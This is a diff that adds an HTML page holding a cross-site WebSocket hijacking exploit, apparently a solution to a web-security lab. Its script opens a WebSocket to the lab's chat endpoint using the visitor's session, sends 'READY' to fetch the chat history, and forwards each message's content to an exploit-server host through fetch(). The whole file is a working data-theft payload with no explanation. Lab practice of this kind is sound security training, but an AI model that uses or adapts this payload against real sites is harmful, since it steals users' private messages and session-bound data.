@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        const attackerIO = new WebSocket("https://0a70004303bb44d283a1cfaa007f0016.web-security-academy.net/chat");  
+
+        attackerIO.onopen = function() {
+            console.log("attacker WebSocket connection established");
+            // Send a message to the server
+            attackerIO.send("READY");
+        };
+        attackerIO.onmessage = function(event) {
+            // console.log("Message from server: ", event.data);
+            if(d = JSON.parse(event.data)) {
+                if(d['content']) {
+                    console.log("From user", d['user'], "Message content: ", d['content']);
+                    fetch('https://exploit-0a870003039b44bd8342ce7c016100c9.exploit-server.net/exploit?data=' + encodeURIComponent(d['content']));
+                }
+            }
+        };
+        attackerIO.onerror = function(error) {
+            console.error("WebSocket error: ", error);
+        };
+        attackerIO.onclose = function() {
+            console.log("WebSocket connection closed");
+        }; 
+    </script>
+</body>
+</html>
